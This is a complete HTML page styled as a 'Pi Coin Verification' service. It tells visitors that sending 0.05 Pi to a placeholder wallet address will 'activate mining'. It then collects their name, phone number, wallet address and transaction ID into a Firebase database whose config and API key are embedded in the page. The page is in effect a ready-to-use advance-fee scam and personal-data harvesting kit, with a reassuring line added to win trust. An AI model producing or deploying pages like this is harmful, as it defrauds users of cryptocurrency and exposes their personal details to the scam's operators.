<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pi Coin Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet" />
  <script type="module">
    // Firebase SDK
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyATI_AQI4SGNhCmErcRqUhmCUY95aixG7E",
      authDomain: "auto-bot-d9a8c.firebaseapp.com",
      projectId: "auto-bot-d9a8c",
      storageBucket: "auto-bot-d9a8c.firebasestorage.app",
      messagingSenderId: "885545261511",
      appId: "1:885545261511:web:1efa3955c6bfc8b3b5a1e2",
      measurementId: "G-XW3XE9ZR4V"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("verify-form");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const name = document.getElementById("name").value;
        const phone = document.getElementById("phone").value;
        const wallet = document.getElementById("wallet").value;
        const txid = document.getElementById("txid").value;

        try {
          await addDoc(collection(db, "verifications"), {
            name,
            phone,
            wallet,
            txid,
            timestamp: new Date()
          });
          alert("Submitted! We'll verify and approve you soon.");
          form.reset();
        } catch (error) {
          console.error("Error saving document:", error);
          alert("Error! Try again.");
        }
      });
    });
  </script>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: #f9f7fc;
      padding: 20px;
    }
    .container {
      max-width: 420px;
      margin: auto;
      background: white;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #5E3C9D;
    }
    label {
      display: block;
      margin-top: 12px;
      font-weight: 500;
    }
    input, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #5E3C9D;
      color: white;
      border: none;
      border-radius: 8px;
      margin-top: 20px;
      font-size: 16px;
      cursor: pointer;
    }
    .note {
      font-size: 14px;
      color: #333;
      margin-top: 10px;
    }
    .highlight {
      background: #FDCB58;
      padding: 8px;
      border-radius: 6px;
      font-weight: bold;
      color: #5E3C9D;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Pi Verification</h2>
    <p class="note">
      To activate mining, send <strong>0.05 Pi</strong> to this address:
    </p>
    <p class="highlight">**YourPiWalletAddressHere**</p>
    <p class="note">Then fill the form below:</p>

    <form id="verify-form">
      <label for="name">Full Name</label>
      <input type="text" id="name" required />

      <label for="phone">Phone Number</label>
      <input type="tel" id="phone" required />

      <label for="wallet">Your Pi Wallet Address</label>
      <input type="text" id="wallet" required />

      <label for="txid">Transaction ID or Proof</label>
      <textarea id="txid" placeholder="Paste transaction ID or notes here..." required></textarea>

      <button type="submit">Submit for Verification</button>
    </form>

    <p class="note" style="margin-top: 20px; font-size: 13px;">
      ⚠️ We will never ask for your passphrase or private key.
    </p>
  </div>
</body>
</html>
